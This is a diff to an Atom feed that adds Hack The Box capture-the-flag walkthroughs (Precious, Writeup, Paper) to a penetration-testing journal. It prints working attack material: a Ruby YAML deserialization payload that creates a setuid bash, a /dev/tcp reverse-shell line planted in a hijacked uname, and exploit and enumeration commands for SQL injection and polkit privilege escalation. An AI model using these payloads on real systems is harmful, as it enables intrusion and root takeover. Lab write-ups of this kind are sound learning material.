@@ -2,64 +2,549 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://danae-pan.github.io/Blog/blog</id>
     <title>Penetration Testing Journal Blog</title>
-    <updated>2025-05-22T08:22:22.339Z</updated>
+    <updated>2025-05-24T00:00:00.000Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://danae-pan.github.io/Blog/blog"/>
     <subtitle>Penetration Testing Journal Blog</subtitle>
     <entry>
         <title type="html"><![CDATA[Precious]]></title>
-        <id>Precious</id>
+        <id>https://danae-pan.github.io/Blog/blog/Precious</id>
         <link href="https://danae-pan.github.io/Blog/blog/Precious"/>
-        <updated>2025-05-22T08:22:22.339Z</updated>
+        <updated>2025-05-24T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/Precious#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>Nginx is running with what additional software designed to serve web applications?</p>
+<p>Navigating to the target IP address we are being redirected to the domain <code>precious.htb</code>. We then add it to the hosts file <code>vim /etc/hosts</code> and reload the page.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-14-2e091da2a07a41b03e9f1fe21dda3673.png" width="1264" height="362" class="img_ev3q"></p>
+<p>After reloading the page, we see that the website's usage is converting web page to pdf.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-15-3865e1fe2f0063cab8d35077043f970a.png" width="1614" height="752" class="img_ev3q"></p>
+<p>We then run <code>whatweb &lt;target_url&gt; -v</code> and find that additional to nginx web server, the software running is Phusion Passenger.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-16-0b38cb81672bdb56d43eb0eadfe3ff7b.png" width="1614" height="328" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/Precious#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>Which HTTP response header reveals the underlying scripting Language of the web application?</p>
+<p>From the same response of <code>whatweb</code>, we see the HTTP response header that specifies the scripting language.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-17-fb2e51f74495059f4807943934bb6c0d.png" width="1212" height="722" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/Precious#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>Which Ruby library are the PDF documents generated with?</p>
+<p>Providing a public url to be converted, we can the error Cannot load remote URL.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-18-fe1ad720eba7d8ce6918e47caa16cf62.png" width="1606" height="532" class="img_ev3q"></p>
+<p>Instead, we start a Python HTTP server by running <code>python3 -m http.server 8080</code>. Then we can provide the IP address of the host machine to be converted as <code>http://&lt;host_ip&gt;:8080</code> and get a pdf file back.</p>
+<p>Running <code>exiftool</code> against the pdf file we get the information we need about the Ruby library.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-19-551c3003bf2df461320e57f04e7ff733.png" width="1644" height="760" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/Precious#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>Which 2022 CVE applies to that specific version of pdfkit?</p>
+<p>By a quick google search we can find the CVE ID 2022-25765 of the Command Injection vulnerability.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/Precious#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>Which directory located in the running user's home directory is used by Bundler to store configuration files?</p>
+<p>Using a PoC for the CVE that can be found at <a href="https://github.com/shamo0/PDFkit-CMD-Injection" target="_blank" rel="noopener noreferrer">text</a>, we start a python server again with the same command <code>python3 -m http.server 8080</code> and listener on port 4444 <code>nc -lvnp 4444</code>. Then we send the curl exploit and we are connected on the target machine.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-20-e5439a5797113a855d4301fa47b167d1.png" width="1298" height="302" class="img_ev3q"></p>
+<p>Moving to rubycd home directory and running <code>ls -a</code> to list the directories, including the hidden ones, we see the .bundle file that contains the configuration files.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/Precious#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>Sumbit the flag located in the henry user's home directory.</p>
+<p>Inside the .bundle directory we open the config file and get the credentials for the user henry.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-22-8d83a0c85f828786739c0f1a6ecce687.png" width="1258" height="162" class="img_ev3q"></p>
+<p>Then, we switch to the henry user by running <code>su - henry</code> and provide the password from before. Running <code>whoami</code> shows us that we are now user henry.</p>
+<p>After navigating to the henry user's home directory and running <code>cat user.txt</code> we get the user flag.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/Precious#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
+<p>Which command can henry run with sudo, without providing a password?</p>
+<p>We are now gonna run the <code>LinEnum.sh</code> script to enumerate the host. For that purpose, we first get the script on our host machine and then open a Python server on port 8888 on the directory the script is at. Then, on the target machine we run <code>wget http://&lt;host_ip&gt;:8888/LinEnum.sh</code>. Looking through the result we see that the user henry can sudo the command <code>/usr/bin/ruby /opt/update_dependencies.rb</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-23-6c6579380afab0d389ca60168220cd88.png" width="1610" height="428" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="https://danae-pan.github.io/Blog/blog/Precious#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
+<p>Which is the name of the file that allows for user-controlled input to the update_dependencies.rb script?</p>
+<p>Opening the file by <code> cat /opt/update_dependencies.rb</code> we see that the file used is <code>dependencies.yml</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-pr-24-a42e425b826d4b8e17820f2718f332c7.png" width="1610" height="592" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="https://danae-pan.github.io/Blog/blog/Precious#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
+<p>Submit the flag located in root's home directory.</p>
+<p>First, we inspect the file <code>update_dependencies.rb</code> and see that there is an unsafe load of the file that allows for user-controlled input.</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain">def list_from_file</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    YAML.load(File.read("dependencies.yml"))</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">end</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>The <code>YAML.load()</code> deserializes YAML into Ruby objects in an insecure way that can lead to arbitary code execution. Based on this gist <a href="https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml" target="_blank" rel="noopener noreferrer">text</a> we craft the following payload and we place it in the henry's home directory.</p>
+<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#bfc7d5;background-color:#292d3e"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">cat &lt;&lt; 'EOF' &gt; dependencies.yml</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">--- </span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">- !ruby/object:Gem::Installer</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  i: x</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">- !ruby/object:Gem::SpecFetcher</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  i: y</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">- !ruby/object:Gem::Requirement</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">  requirements:</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">    !ruby/object:Gem::Package::TarReader</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">      io: &amp;1 !ruby/object:Net::BufferedIO</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">          read: 0</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">          header: "abc"</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">        debug_output: &amp;1 !ruby/object:Net::WriteAdapter</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">          socket: &amp;1 !ruby/object:Gem::RequestSet</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            sets: !ruby/object:Net::WriteAdapter</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">              socket: !ruby/module 'Kernel'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">              method_id: :system</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">            git_set: cp /bin/bash /tmp/dani; chmod +6777 /tmp/dani</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">          method_id: :resolve</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token plain">EOF</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
+<p>We run the script as root <code>sudo /usr/bin/ruby /opt/update_dependencies.rb</code> that is possible without providing password and then use the command <code>/tmp/dani -p</code> which launches a new shell. The <code>-p</code> flag tells bash to preserve the effective UID, which is 0 meaning root thanks to the setuid bit of the chmod command. Finally navigating to the <code>/root</code> directory and <code>cat root.txt</code> gives us the root flag.</p>]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[Writeup]]></title>
-        <id>Writeup</id>
+        <id>https://danae-pan.github.io/Blog/blog/Writeup</id>
         <link href="https://danae-pan.github.io/Blog/blog/Writeup"/>
-        <updated>2025-04-11T08:48:08.194Z</updated>
+        <updated>2025-05-12T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/Writeup#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>Submit user flag.</p>
+<p>Opening the browser to the IP address of the target it is revealed that the web site uses DDoS protection.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-2-edee0b487498a35ab805b00c27472d19.png" width="1600" height="536" class="img_ev3q"></p>
+<p>Navigating to <code>/robots.txt</code> we can see that there is a path called <code>writeup/</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-3-fd2dfec598f7f566bc34c6788ff09209.png" width="1366" height="666" class="img_ev3q"></p>
+<p>The <code>writeup/</code> path shows the following page:</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-4-e99f4bf3d12c749acf74390dadd83c18.png" width="1914" height="964" class="img_ev3q"></p>
+<p>Running <code>whatweb</code> against the website <code>whatweb &lt;target_ip&gt;/writeup -v</code> we find the CMS to be <code>CMS Made Simple</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-5-ea80ef4d3ec4d054597c85373da15a6d.png" width="2146" height="438" class="img_ev3q"></p>
+<p>We can then try the directories used which can be found at <code>http://svn.cmsmadesimple.org/svn/cmsmadesimple/trunk/</code>.</p>
+<p>Trying out the path <code>admin/</code> we get a pop-up to authenticate, default credentials <code>username=admin</code> and <code>password=admin</code> did not get us in.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-6-309cf4b61982bcc6601ef5fd7ffc18a6.png" width="1042" height="610" class="img_ev3q"></p>
+<p>Next, other directories are being tried to find the version of the CMS. At <code>doc/CHANGELOG.txt</code> we found that the version is 2.2.9.1.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-7-ab253a260d6d01db60452538f318c328.png" width="1042" height="492" class="img_ev3q"></p>
+<p>Using <code>searchsploit CMS Made Simple</code> we search for exploits and find versions lower than 2.2.10 are vulnerable to SQL Injection.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-8-c074d0f78a42b5f2bf32d1349d5aad5e.png" width="1420" height="106" class="img_ev3q"></p>
+<p>We can then copy the exploit from searchsploitby running <code>searchsploit -m php/webapps/46635.py</code> and run it by <code>python3 46635.py -u http://&lt;target_ip&gt;/writeup/ -c -w rocktou.txt</code> where the -c switch is specified to crack the detected password. The script detects the credentials which we can then use for the admin login prompt. This did not work but after trying ssh with the same credentials <code>ssh &lt;username&gt;@&lt;target_ip&gt;</code> we get in and find the user flag on the home directory of the user by <code>cat user.txt</code>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/Writeup#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>Submit root flag.</p>
+<p>To see if we can exploit any vulnerabilities on the target machine we run the script for Linux Enumeration. After getting the bash file on the host machine, we open a server on port 8000, on the directory we downloaded the file to, using the command<br>
+<code>python3 -m http.server 8000</code></p>
+<p>On the target machine we run<br>
+<code>wget http://10.10.14.85:8000/LinEnum.sh -O /tmp/LinEnum.sh</code></p>
+<p>After running the script, we find the user being on the staff group which allows users to add local modifications to the system (<code>/usr/local</code>) without needing root privileges. This means if root runs a script or command, and that command is resolved to your version in <code>/usr/local/bin</code>, it will run your code as root.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-9-985c767c3720e2eb3c46f8351d77f770.png" width="1600" height="224" class="img_ev3q"></p>
+<p>We run the following to see which services or scripts might be impacted by <code>/usr/local/bin</code>:
+<code>grep -r "/usr/local/bin" /etc/profile* /etc/bash.bashrc /etc/pam.d /etc/update-motd.d 2&gt;/dev/null</code>.
+We confirm that <code>/usr/local/bin</code> is part of the <code>PATH</code> environment and that the update-motd system executes <code>uname</code>. Then, we verify that <code>/etc/update-motd.d/10-uname</code> indeed runs <code>uname</code>, meaning it could execute our payload if replaced:</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-10-5c472f014f25d9d3690f00b4ba9b9548.png" width="1788" height="320" class="img_ev3q"></p>
+<p>Since <code>/usr/local/bin</code> comes first in the <code>PATH</code>, we can hijack <code>uname</code> with our own reverse shell payload.</p>
+<p>We first start a listener on our machine:<br>
+<code>nc -lvnp 4444</code></p>
+<p>Then we overwrite <code>uname</code> with a malicious script in <code>/usr/local/bin/uname</code>:<br>
+<code>echo -e '#!/bin/bash\n/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.85/4444 0&gt;&amp;1' &gt; /usr/local/bin/uname</code><br>
+<code>chmod +x /usr/local/bin/uname</code></p>
+<p>Now, when the system runs <code>uname</code> during SSH login, it executes our reverse shell and gives us a root shell.</p>
+<p>Once the reverse shell connects back, we are root and we can read the root flag.
+<code>cd /root</code><br>
+<code>cat root.txt</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-w-11-7ae9c2b10a235c9a8e58d3338d2117ec.png" width="1600" height="318" class="img_ev3q"></p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="linux" term="linux"/>
     </entry>
     <entry>
         <title type="html"><![CDATA[Paper]]></title>
-        <id>Paper</id>
+        <id>https://danae-pan.github.io/Blog/blog/Paper</id>
         <link href="https://danae-pan.github.io/Blog/blog/Paper"/>
-        <updated>2025-04-06T21:16:41.470Z</updated>
+        <updated>2025-05-05T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/Paper#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>How many TCP ports are open on the remote host?</p>
+<p><code>nmap -sS &lt;target_ip&gt;</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-1-d23893e8bdd9381fd08d82682fa601cf.png" width="1378" height="462" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-2">Task 2<a href="https://danae-pan.github.io/Blog/blog/Paper#task-2" class="hash-link" aria-label="Direct link to Task 2" title="Direct link to Task 2">​</a></h3>
+<p>What is the domain for the Wordpress blog?</p>
+<p>For answering this, we will attempt checking the information coming from the headers.</p>
+<p><code>curl -I &lt;target_ip&gt;</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-2-7221cf04b4960b24b208b606c281ddf0.png" width="775" height="263" class="img_ev3q"></p>
+<p>We can se that the server is leaking information from the backend systems from the X-Backend-Server header that contains the hostname of the target IP.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-3">Task 3<a href="https://danae-pan.github.io/Blog/blog/Paper#task-3" class="hash-link" aria-label="Direct link to Task 3" title="Direct link to Task 3">​</a></h3>
+<p>Which 2019 CVE is the wordpress version vulnerable to?</p>
+<p>First, we need to identify the version of wordpress. First, we add the domain to the host file by <code>sudo vim /etc/hosts</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-3-61f0d3cc7ec0a2cc30019cd03d5893e6.png" width="873" height="210" class="img_ev3q"></p>
+<p>Then, we use wpscan, the WordPress security scanner, to find the version and any vulnerabilities.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-4-311aec8fdcb7edd7fc8f2337c8afe033.png" width="1214" height="731" class="img_ev3q"></p>
+<p>We found both the readme.html file location, which usually contains the wordpress version but the specific version was already identified. With a quick google search about the specific version we find the 2019 CVE.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-4">Task 4<a href="https://danae-pan.github.io/Blog/blog/Paper#task-4" class="hash-link" aria-label="Direct link to Task 4" title="Direct link to Task 4">​</a></h3>
+<p>What is the secret registration URL of the employee chat system?</p>
+<p>We first need to enumerate the directories using gobuster dir.</p>
+<p><code>gobuster dir -u http://office.paper/ -w &lt;word_list&gt;</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-5-9f04ccf1033dfa45b3a80c518fb56eb5.png" width="858" height="672" class="img_ev3q"></p>
+<p>Navigating to the index.php page we see some kind of chat system.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-6-48216df3ac3a7de794a4d5ac8b930617.png" width="700" height="664" class="img_ev3q"></p>
+<p>Going back to the CVE we previously found, this version could allow an unauthenticated user to view private or draft posts. Navigating to the page we also find this interesting post by the user Prinsonmike. Seems that we can use this wordpress vulnerability to access his draft hoping we can find this secret url.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-8-b48a3b57ae20b928f8913c109e1736c1.png" width="639" height="591" class="img_ev3q"></p>
+<p>We navigate <code>http://office.paper/?static=1</code> and exploit the vulnerability and find the secret url.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-9-4d69abc44ef1bb79c90a4c069caace5d.png" width="639" height="519" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-5">Task 5<a href="https://danae-pan.github.io/Blog/blog/Paper#task-5" class="hash-link" aria-label="Direct link to Task 5" title="Direct link to Task 5">​</a></h3>
+<p>What is the name of the bot running on the Rocket Chat instance?</p>
+<p>We need to first add to the hosts file the subdomain <code>chat.office.paper</code> so the ip get resolved.</p>
+<p>Navigating to the secret url we found on the previous task we see the registration form.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-10-7304dbaee416aa6458274a48fdd2e9c0.png" width="639" height="536" class="img_ev3q"></p>
+<p>We register, and the go to the general channel where we see the name of the bot.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-11-fa8caaddef1019ec0d7735031f27a1cc.png" width="703" height="111" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-6">Task 6<a href="https://danae-pan.github.io/Blog/blog/Paper#task-6" class="hash-link" aria-label="Direct link to Task 6" title="Direct link to Task 6">​</a></h3>
+<p>Which recyclops commands allows listing files?</p>
+<p>In the "How to use me?" guide of the bot we see all the commands, including the one listing files.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-12-d4c13f83c2f0a2232856e3c2151eeb38.png" width="703" height="528" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-7">Task 7<a href="https://danae-pan.github.io/Blog/blog/Paper#task-7" class="hash-link" aria-label="Direct link to Task 7" title="Direct link to Task 7">​</a></h3>
+<p>What is the file name of the file that contains the configuration information of hubot running on the chat system?</p>
+<p>Hubot is a framework to build chat bots. We will try to chat with recyclops, using the commands available to extract the information about the name of the file. Running <code>list</code> we see that we are on user dwight home directory.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-15-2ac857edd93cf1cec5182061be6e7495.png" width="526" height="242" class="img_ev3q"></p>
+<p>We go back to the direcotry with <code>list ../</code> and then list the directory hubot <code>list ../hubot</code>.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-16-80dc6b0c6547360b9d7e78cfd01b4b48.png" width="526" height="509" class="img_ev3q"></p>
+<p>Looking through the listed files and google searching hubot documentation to cross-reference, we see some files that could be possible like <code>.env</code> and <code>external-scripts</code>. We see their contents, first <code>file ../hubot/external-scripts.json</code> is empty and then <code>file ../hubot/.env</code> is the one containing the configuration.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-17-cefb8c1c6014835d58f8188291472f69.png" width="526" height="322" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-8">Task 8<a href="https://danae-pan.github.io/Blog/blog/Paper#task-8" class="hash-link" aria-label="Direct link to Task 8" title="Direct link to Task 8">​</a></h3>
+<p>What is the password obtained from that configuration information?</p>
+<p>From the <code>.env</code> file we obtained from the previous question, we find the password.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-9">Task 9<a href="https://danae-pan.github.io/Blog/blog/Paper#task-9" class="hash-link" aria-label="Direct link to Task 9" title="Direct link to Task 9">​</a></h3>
+<p>Which regular user with a home directory exists on Paper other than rocketchat?</p>
+<p>From the previous tasks, we saw that we where on the regular user dwight directory.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-10">Task 10<a href="https://danae-pan.github.io/Blog/blog/Paper#task-10" class="hash-link" aria-label="Direct link to Task 10" title="Direct link to Task 10">​</a></h3>
+<p>Submit the flag located in the dwight user's home directory.</p>
+<p>Previously, when we listed the home directory, by running <code>list ../</code> we came accross the <code>user.txt</code> file. We try to see the contents and get the user flag by <code>file ../user.txt</code> but we get access denied. We try to ssh to the target ip with the username dwight <code>ssh dwight@&lt;target_ip</code> and the password we found in the <code>.env</code> file and we are in! We get the user flag by <code>cat user.txt</code>.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-11">Task 11<a href="https://danae-pan.github.io/Blog/blog/Paper#task-11" class="hash-link" aria-label="Direct link to Task 11" title="Direct link to Task 11">​</a></h3>
+<p>What is the polkit version on the remote host?</p>
+<p>We first run <code>cat /etc/os-release</code> to find which os we are on and we see that we are on CentOS. Then we can run <code>rpm -qa | grep polkit </code> to find the version of polkit.</p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-18-bb49644762a1bab9752b51f91f253f55.png" width="532" height="356" class="img_ev3q">
+<img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-19-a615991ddbe7d98e2868a4515644040b.png" width="417" height="112" class="img_ev3q"></p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-12">Task 12<a href="https://danae-pan.github.io/Blog/blog/Paper#task-12" class="hash-link" aria-label="Direct link to Task 12" title="Direct link to Task 12">​</a></h3>
+<p>What is the 2021 CVE ID for the vulnerability in this version of polkit related to bypassing credential checks for D-Bus requests?</p>
+<p>Looking up for CVEs affecting the version of the polkit found, we find CVE-2021-3560 for the vulnerability that allows an unprivileged user to create an administrative user without authentication by abusing D-Bus and timing.</p>
+<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-13">Task 13<a href="https://danae-pan.github.io/Blog/blog/Paper#task-13" class="hash-link" aria-label="Direct link to Task 13" title="Direct link to Task 13">​</a></h3>
+<p>In our machine, we clone the exploit from github <a href="https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation" target="_blank" rel="noopener noreferrer">https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation</a>. Then, we open a http server on port 8080 using <code>python3 -m http.server 8080</code>. From the remote server, we use wget to get the exploit script <code>wget http://&lt;host_ip&gt;:8080/poc.sh</code>. We then <code>chmod +x poc.sh</code> and run the exploit as many times as needed to get the timing right. We follow the exploit's instruction and get a root shell as the secnigma user.</p>
+<p>We navigate to the root directory and obtain the root flag by <code>cat root.txt</code></p>
+<p><img decoding="async" loading="lazy" alt="alt text" src="https://danae-pan.github.io/Blog/assets/images/image-p-20-d4449895b688d00017627e8a6ce3c5d0.png" width="813" height="425" class="img_ev3q"></p>]]></content>
+        <category label="easy" term="easy"/>
+        <category label="linux" term="linux"/>
     </entry>
     <entry>
         <title type="html"><![CDATA[Devvortex]]></title>
-        <id>Devvortex</id>
+        <id>https://danae-pan.github.io/Blog/blog/Devvortex</id>
         <link href="https://danae-pan.github.io/Blog/blog/Devvortex"/>
-        <updated>2025-04-05T21:15:54.538Z</updated>
+        <updated>2025-04-25T00:00:00.000Z</updated>
         <summary type="html"><![CDATA[Task 1]]></summary>
+        <content type="html"><![CDATA[<h3 class="anchor anchorWithStickyNavbar_LWe7" id="task-1">Task 1<a href="https://danae-pan.github.io/Blog/blog/Devvortex#task-1" class="hash-link" aria-label="Direct link to Task 1" title="Direct link to Task 1">​</a></h3>
+<p>How many open TCP ports are listening on Devvortex?</p>
